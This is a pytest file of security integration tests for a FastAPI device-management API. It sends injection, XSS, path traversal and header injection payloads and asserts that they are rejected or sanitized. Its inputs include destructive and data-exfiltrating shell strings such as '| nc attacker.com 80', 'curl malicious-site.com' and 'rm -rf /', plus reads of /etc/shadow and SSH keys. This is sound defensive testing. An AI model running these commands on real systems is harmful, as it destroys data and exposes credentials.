"""Integration tests for security features and validation."""

import pytest
from unittest.mock import patch, Mock
from fastapi import status
import ipaddress
import json


class TestTailscaleSecurityIntegration:
    """Test Tailscale subnet security integration."""
    
    def test_tailscale_subnet_enforcement(self):
        """Test that Tailscale subnet restrictions are enforced.""" 
        from fastapi.testclient import TestClient
        from main import app
        
        # Create a test client that simulates external IP
        class MockedIPTestClient(TestClient):
            def __init__(self, app, external_ip="8.8.8.8"):
                super().__init__(app)
                self.external_ip = external_ip
            
            def request(self, method, url, **kwargs):
                # Mock the client IP to be external
                with patch("starlette.requests.Request.client") as mock_client:
                    mock_client.host = self.external_ip
                    return super().request(method, url, **kwargs)
        
        # This is a conceptual test - TestClient doesn't actually trigger middleware
        # In real deployment, this would be tested with actual network requests
        
    def test_localhost_bypass_functionality(self, test_client_macos):
        """Test that localhost bypass works correctly."""
        # TestClient uses localhost, so requests should work
        response = test_client_macos.get("/health")
        assert response.status_code == 200
        
        # Test root endpoint
        response = test_client_macos.get("/")
        assert response.status_code == 200
    
    def test_cors_header_security(self, test_client_macos):
        """Test CORS header security configuration."""
        response = test_client_macos.get("/", headers={
            "Origin": "https://malicious-domain.com"
        })
        
        # Should include CORS headers
        cors_headers = [
            "access-control-allow-origin",
            "access-control-allow-credentials",
            "access-control-allow-methods",
            "access-control-allow-headers"
        ]
        
        # Note: TestClient may not fully simulate CORS behavior
        # This tests the basic header presence
        assert response.status_code == 200


class TestInputValidationSecurity:
    """Test input validation for security vulnerabilities."""
    
    def test_sql_injection_prevention(self, test_client_macos):
        """Test prevention of SQL injection attacks."""
        # Test SQL injection in query parameters
        sql_injection_attempts = [
            "'; DROP TABLE users;--",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM devices;",
        ]
        
        for injection in sql_injection_attempts:
            # Test in various parameters
            response = test_client_macos.get("/health", params={
                "device_id": injection,
                "filter": injection
            })
            
            # Should handle safely
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                response_text = response.text.lower()
                # Response should not contain SQL keywords indicating successful injection
                dangerous_indicators = ["dropped", "deleted", "table", "select * from"]
                assert not any(indicator in response_text for indicator in dangerous_indicators)
    
    def test_xss_prevention(self, test_client_macos):
        """Test prevention of cross-site scripting attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "';alert('XSS');//",
        ]
        
        for payload in xss_payloads:
            response = test_client_macos.get("/health", params={"name": payload})
            
            # Should handle safely
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                response_text = response.text
                # Payload should be escaped or removed
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onerror=" not in response_text
    
    def test_command_injection_prevention(self, test_client_macos):
        """Test prevention of command injection attacks."""
        command_injection_attempts = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 80",
            "`whoami`",
            "$(id)",
            "test; curl malicious-site.com"
        ]
        
        # Test in action endpoints that might execute commands
        for injection in command_injection_attempts:
            response = test_client_macos.post("/actions/reboot", json={
                "reason": injection,
                "delay": injection
            })
            
            # Should handle safely - either reject or sanitize
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                data = response.json()
                # If action failed, should be due to validation, not injection
                if not data.get("success", True):
                    assert "validation" in data.get("error", "").lower() or \
                           "invalid" in data.get("error", "").lower()
    
    def test_path_traversal_prevention(self, test_client_orangepi):
        """Test prevention of path traversal attacks."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "~/.ssh/id_rsa",
            "file:///etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"  # URL encoded
        ]
        
        for path_attempt in path_traversal_attempts:
            # Test in screenshot endpoints that handle file paths
            response = test_client_orangepi.get("/screenshots/latest", params={
                "path": path_attempt,
                "file": path_attempt
            })
            
            # Should prevent access to sensitive files
            assert response.status_code in [200, 400, 403, 404]
            
            if response.status_code == 200:
                data = response.json()
                # Should not return sensitive file contents
                sensitive_indicators = ["root:", "shadow:", "-----BEGIN"]
                response_str = json.dumps(data) if isinstance(data, dict) else str(data)
                assert not any(indicator in response_str for indicator in sensitive_indicators)


class TestAuthenticationSecurity:
    """Test authentication security (if implemented)."""
    
    def test_api_without_authentication_current_state(self, test_client_macos):
        """Test current API behavior without authentication."""
        # Currently no authentication - document this behavior
        response = test_client_macos.get("/health")
        assert response.status_code == 200
        
        # Document that sensitive endpoints are accessible
        sensitive_endpoints = [
            "/actions/reboot",
            "/platform",
            "/health"
        ]
        
        for endpoint in sensitive_endpoints:
            if endpoint.startswith("/actions/"):
                response = test_client_macos.post(endpoint)
            else:
                response = test_client_macos.get(endpoint)
            
            # Currently accessible without auth
            assert response.status_code in [200, 405, 422]  # Not 401/403
    
    def test_rate_limiting_absence(self, test_client_macos):
        """Test current absence of rate limiting (document for security review)."""
        # Make multiple rapid requests
        responses = []
        for _ in range(20):
            response = test_client_macos.get("/health")
            responses.append(response)
        
        # Currently no rate limiting - all should succeed
        for response in responses:
            assert response.status_code == 200
        
        # Document this for future security enhancement
        assert len([r for r in responses if r.status_code == 200]) == 20


class TestDataValidationSecurity:
    """Test data validation for security vulnerabilities."""
    
    def test_integer_overflow_handling(self, test_client_macos):
        """Test handling of integer overflow attacks."""
        overflow_values = [
            2**63,     # Large positive
            -(2**63),  # Large negative
            2**128,    # Very large
            "9" * 100  # String of digits
        ]
        
        for value in overflow_values:
            response = test_client_macos.get("/health", params={
                "timeout": str(value),
                "limit": str(value)
            })
            
            # Should handle overflow gracefully
            assert response.status_code in [200, 400, 422]
    
    def test_unicode_security_handling(self, test_client_macos):
        """Test handling of unicode security attacks."""
        unicode_attacks = [
            "\u0000",  # Null byte
            "\ufeff",  # BOM
            "\u202e",  # Right-to-left override
            "test\u0008\u0008\u0008\u0008admin",  # Backspace attack
        ]
        
        for attack in unicode_attacks:
            response = test_client_macos.get("/health", params={"name": attack})
            
            # Should handle unicode attacks safely
            assert response.status_code in [200, 400, 422]
            
            if response.status_code == 200:
                response_text = response.text
                # Should not contain raw control characters
                assert "\u0000" not in response_text
                assert "\u0008" not in response_text
    
    def test_buffer_overflow_simulation(self, test_client_macos):
        """Test handling of buffer overflow simulation."""
        # Very long strings that might cause buffer issues
        long_strings = [
            "A" * 10000,    # 10KB string
            "测试" * 5000,   # Unicode characters
            "\n" * 1000,    # Many newlines
        ]
        
        for long_string in long_strings:
            response = test_client_macos.post("/actions/reboot", json={
                "reason": long_string
            })
            
            # Should handle long inputs safely
            assert response.status_code in [200, 400, 413, 422]


class TestPrivilegeEscalationPrevention:
    """Test prevention of privilege escalation attacks."""
    
    @patch("subprocess.run")
    def test_sudo_command_restriction(self, mock_run, test_client_macos):
        """Test that sudo commands are restricted appropriately."""
        mock_run.return_value = Mock(returncode=0, stdout="success")
        
        # Test action that should use sudo (reboot)
        response = test_client_macos.post("/actions/reboot")
        
        if mock_run.called and response.status_code == 200:
            # Reboot should legitimately use sudo
            call_args = mock_run.call_args[0][0]
            if "sudo" in call_args:
                # Should only be for legitimate system operations
                assert any(cmd in call_args for cmd in ["shutdown", "reboot"])
    
    @patch("subprocess.run")
    def test_user_command_execution(self, mock_run, test_client_macos):
        """Test that user-level commands don't use unnecessary privileges."""
        mock_run.return_value = Mock(returncode=0, stdout="user data")
        
        # Test endpoints that get user-level data
        response = test_client_macos.get("/health")
        
        if mock_run.called:
            # Most health checks should not require sudo
            for call in mock_run.call_args_list:
                call_args = call[0][0] if call[0] else []
                if "system_profiler" in call_args or "ps" in call_args:
                    # These commands should not need sudo
                    assert "sudo" not in call_args


class TestInformationDisclosurePrevention:
    """Test prevention of information disclosure vulnerabilities."""
    
    def test_error_message_information_leakage(self, test_client_macos):
        """Test that error messages don't leak sensitive information."""
        # Force various error conditions
        error_endpoints = [
            "/nonexistent_endpoint",
            "/cameras/invalid_id/stream",
            "/actions/invalid_action"
        ]
        
        for endpoint in error_endpoints:
            if endpoint.startswith("/actions/"):
                response = test_client_macos.post(endpoint)
            else:
                response = test_client_macos.get(endpoint)
            
            if response.headers.get("content-type", "").startswith("application/json"):
                try:
                    data = response.json()
                    error_msg = data.get("detail", "")
                    
                    # Should not contain sensitive paths
                    sensitive_paths = [
                        "/Users/", 
                        "/home/",
                        "/src/",
                        "__pycache__",
                        ".env",
                        "config.py"
                    ]
                    
                    for path in sensitive_paths:
                        assert path not in error_msg, f"Error message contains sensitive path: {path}"
                        
                except json.JSONDecodeError:
                    # Non-JSON response is okay
                    pass
    
    def test_stack_trace_information_leakage(self, test_client_macos):
        """Test that stack traces are not exposed in production."""
        # Force an exception
        with patch("src.oaDeviceAPI.core.platform.platform_manager.get_platform_info",
                  side_effect=Exception("Internal error for testing")):
            
            response = test_client_macos.get("/platform")
            
            if response.headers.get("content-type", "").startswith("application/json"):
                try:
                    data = response.json()
                    response_text = json.dumps(data)
                    
                    # Should not contain stack trace elements
                    stack_indicators = [
                        "Traceback",
                        "File \"/",
                        "line ",
                        ".py\", line",
                        "raise Exception",
                        "__main__"
                    ]
                    
                    for indicator in stack_indicators:
                        assert indicator not in response_text, \
                            f"Response contains stack trace indicator: {indicator}"
                            
                except json.JSONDecodeError:
                    pass
    
    def test_system_information_exposure(self, test_client_macos, test_client_orangepi):
        """Test that system information exposure is appropriate."""
        endpoints = ["/platform", "/health"]
        
        for endpoint in endpoints:
            for client in [test_client_macos, test_client_orangepi]:
                response = client.get(endpoint)
                
                if response.status_code == 200:
                    data = response.json()
                    response_text = json.dumps(data)
                    
                    # Should not expose overly sensitive system details
                    sensitive_info = [
                        "password",
                        "secret",
                        "private_key",
                        "token",
                        "/root/",
                        "127.0.0.1",  # Internal IPs should be minimal
                    ]
                    
                    for info in sensitive_info:
                        assert info not in response_text.lower(), \
                            f"Response exposes sensitive info: {info}"


class TestInputSanitizationIntegration:
    """Test input sanitization across API endpoints."""
    
    def test_special_character_handling(self, test_client_macos):
        """Test handling of special characters in input."""
        special_chars = [
            "!@#$%^&*()",
            "{}[]|\\:;\"'<>,./",
            "åäö",  # Non-ASCII
            "🔥💯",  # Emojis
            "\r\n\t",  # Control characters
        ]
        
        for chars in special_chars:
            # Test in query parameters
            response = test_client_macos.get("/health", params={
                "filter": chars,
                "device_name": chars
            })
            
            # Should handle special characters safely
            assert response.status_code in [200, 400, 422]
    
    def test_json_payload_sanitization(self, test_client_macos):
        """Test JSON payload sanitization."""
        malicious_payloads = [
            {"command": "; rm -rf /"},
            {"script": "<script>alert('xss')</script>"},
            {"sql": "' OR 1=1--"},
            {"path": "../../../etc/passwd"},
        ]
        
        for payload in malicious_payloads:
            response = test_client_macos.post("/actions/reboot", json=payload)
            
            # Should sanitize or reject malicious payloads
            assert response.status_code in [200, 400, 422]
    
    def test_header_injection_prevention(self, test_client_macos):
        """Test prevention of header injection attacks."""
        malicious_headers = {
            "X-Custom-Header": "value\r\nInjected-Header: malicious",
            "User-Agent": "Mozilla\r\nX-Injected: attack",
            "Accept": "application/json\r\n\r\n<script>alert('xss')</script>"
        }
        
        response = test_client_macos.get("/health", headers=malicious_headers)
        
        # Should handle header injection safely
        assert response.status_code in [200, 400]
        
        # Response headers should not contain injected content
        for header_name, header_value in response.headers.items():
            assert "\r\n" not in header_value
            assert "<script>" not in header_value


class TestFileSystemSecurityIntegration:
    """Test file system security integration."""
    
    def test_screenshot_path_validation_integration(self, test_client_orangepi):
        """Test that screenshot paths are properly validated."""
        dangerous_paths = [
            "../../../etc/passwd",
            "/root/.ssh/id_rsa", 
            "/etc/shadow",
            "~/.bash_history",
            "/proc/version"
        ]
        
        for path in dangerous_paths:
            response = test_client_orangepi.post("/screenshots/capture", json={
                "filename": path,
                "path": path
            })
            
            # Should reject dangerous paths
            assert response.status_code in [400, 403, 422]
    
    def test_file_upload_security_boundaries(self, test_client_orangepi):
        """Test file upload security boundaries."""
        # Test various file types and paths
        test_files = [
            ("script.sh", b"#!/bin/bash\nrm -rf /"),  # Executable script
            ("config.conf", b"password=secret123"),   # Config with secrets
            ("image.png", b"\x89PNG\r\n\x1a\n"),     # Valid image header
            (".htaccess", b"Options +ExecCGI"),      # Web server config
        ]
        
        for filename, content in test_files:
            # Mock file upload scenario
            files = {"file": (filename, content, "application/octet-stream")}
            
            # Note: This endpoint may not exist, testing the concept
            response = test_client_orangepi.post("/screenshots/upload", files=files)
            
            # Should validate file types and content
            # Exact status depends on implementation
            assert response.status_code in [200, 400, 403, 404, 415, 422]
    
    def test_symlink_attack_prevention(self, test_client_orangepi):
        """Test prevention of symlink attacks."""
        with patch("pathlib.Path.is_symlink", return_value=True):
            response = test_client_orangepi.get("/screenshots/latest")
            
            # Should not follow dangerous symlinks
            assert response.status_code in [200, 400, 403]
            
            if response.status_code == 200:
                data = response.json()
                # Should not return content from symlinked files
                assert data.get("error") or not data.get("success", True)


class TestDenialOfServicePrevention:
    """Test prevention of denial of service attacks."""
    
    def test_resource_exhaustion_limits(self, test_client_macos):
        """Test API limits to prevent resource exhaustion."""
        # Test rapid successive requests
        responses = []
        for i in range(100):  # Many requests
            response = test_client_macos.get("/health")
            responses.append(response)
            
            # Stop if we hit rate limiting
            if response.status_code == 429:  # Too Many Requests
                break
        
        # Should either handle all requests or implement rate limiting
        success_count = len([r for r in responses if r.status_code == 200])
        rate_limited_count = len([r for r in responses if r.status_code == 429])
        
        # Either all succeed (no rate limiting) or some are rate limited
        assert (success_count + rate_limited_count) == len(responses)
    
    def test_memory_exhaustion_protection(self, test_client_macos):
        """Test protection against memory exhaustion attacks."""
        # Test with large query parameters
        large_param = "x" * 100000  # 100KB parameter
        
        response = test_client_macos.get("/health", params={
            "large_param": large_param
        })
        
        # Should either handle or reject large parameters
        assert response.status_code in [200, 400, 413, 414]
    
    def test_cpu_exhaustion_protection(self, test_client_macos):
        """Test protection against CPU exhaustion attacks."""
        # Test endpoints that might be CPU intensive
        cpu_intensive_requests = [
            "/health",  # Might do system calls
            "/platform",  # Platform detection
        ]
        
        import time
        
        for endpoint in cpu_intensive_requests:
            start_time = time.time()
            response = test_client_macos.get(endpoint)
            end_time = time.time()
            
            # Should complete in reasonable time (< 5 seconds)
            assert (end_time - start_time) < 5.0
            assert response.status_code in [200, 500, 503]


class TestSecurityHeadersIntegration:
    """Test security headers integration."""
    
    def test_security_headers_presence(self, test_client_macos):
        """Test presence of security headers."""
        response = test_client_macos.get("/health")
        
        # Document current security header state
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options", 
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        
        present_headers = []
        for header in security_headers:
            if header.lower() in [h.lower() for h in response.headers]:
                present_headers.append(header)
        
        # Document which security headers are currently implemented
        # This test serves as documentation and future security enhancement guide
        # Currently FastAPI doesn't add security headers by default
    
    def test_content_type_security(self, test_client_macos):
        """Test content type security."""
        response = test_client_macos.get("/health")
        
        content_type = response.headers.get("content-type", "")
        
        # Should have proper content type
        assert "application/json" in content_type
        # Should include charset for text content
        if "text/" in content_type:
            assert "charset=" in content_type


class TestLoggingSecurityIntegration:
    """Test security aspects of logging integration."""
    
    def test_access_logging_no_sensitive_data(self, test_client_macos, caplog):
        """Test that access logs don't contain sensitive data."""
        import logging
        
        with caplog.at_level(logging.INFO):
            # Make request with potential sensitive data
            headers = {
                "Authorization": "Bearer secret_token_123",
                "X-API-Key": "api_key_456"
            }
            
            response = test_client_macos.get("/health", headers=headers)
            
            # Check logs don't contain sensitive headers
            log_text = " ".join([record.getMessage() for record in caplog.records])
            assert "secret_token_123" not in log_text
            assert "api_key_456" not in log_text
    
    def test_error_logging_sanitization(self, test_client_macos, caplog):
        """Test that error logs are sanitized."""
        import logging
        
        with caplog.at_level(logging.ERROR):
            # Force an error with potential sensitive context
            with patch("src.oaDeviceAPI.core.platform.platform_manager.get_platform_info",
                      side_effect=Exception("Database password: secret123")):
                
                response = test_client_macos.get("/platform")
                
                # Error logs should not contain the sensitive data
                log_text = " ".join([record.getMessage() for record in caplog.records])
                assert "secret123" not in log_text
    
    def test_audit_logging_completeness(self, test_client_macos, caplog):
        """Test audit logging for security-relevant actions."""
        import logging
        
        with caplog.at_level(logging.INFO):
            # Test security-relevant actions
            security_actions = [
                ("POST", "/actions/reboot"),
                ("POST", "/actions/restart-tracker"),
            ]
            
            for method, endpoint in security_actions:
                response = test_client_macos.request(method, endpoint)
                
                # Should log security-relevant actions
                # This test documents expected audit behavior
                action_logs = [r for r in caplog.records 
                              if endpoint.split("/")[-1] in r.getMessage().lower()]
                
                # May or may not have audit logging currently implemented
                # This test serves as documentation for security requirements